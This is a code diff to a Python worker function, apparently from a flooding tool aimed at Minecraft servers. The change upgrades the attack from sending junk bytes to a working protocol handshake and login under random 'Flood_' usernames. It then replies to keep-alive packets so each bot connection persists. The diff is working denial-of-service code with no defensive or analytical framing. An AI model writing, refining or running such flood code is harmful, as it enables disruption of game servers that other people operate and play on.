@@ -1539,9 +1539,36 @@ def _mc_packet(pid, *parts):
 def _mc_flood_worker(host, port, results, idx):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(2)
+        s.settimeout(4)
         s.connect((host, port))
-        s.sendall(MC_GARBAGE[idx % len(MC_GARBAGE)])
+        handshake = _mc_packet(0x00, _mc_varint(764), _mc_pstr(host), port.to_bytes(2, "big"), _mc_varint(2))
+        s.sendall(handshake)
+        username = f"Flood_{random.randint(10000,99999)}_{random.choice(['X','Pro','YT','OP','HD'])}"
+        login = _mc_packet(0x00, _mc_pstr(username))
+        s.sendall(login)
+        end = time.time() + 3
+        while time.time() < end:
+            try:
+                s.settimeout(0.5)
+                plen = _mc_read_varint(s)
+                if plen is None:
+                    break
+                pid = _mc_read_varint(s)
+                if pid is None:
+                    break
+                rest = plen - len(_mc_varint(pid))
+                data = b""
+                while len(data) < rest:
+                    chunk = s.recv(rest - len(data))
+                    if not chunk:
+                        break
+                    data += chunk
+                if pid == 0x21:
+                    s.sendall(_mc_packet(0x0F, data))
+            except socket.timeout:
+                continue
+            except Exception:
+                break
         s.close()
         results[idx] = 1
         return 1
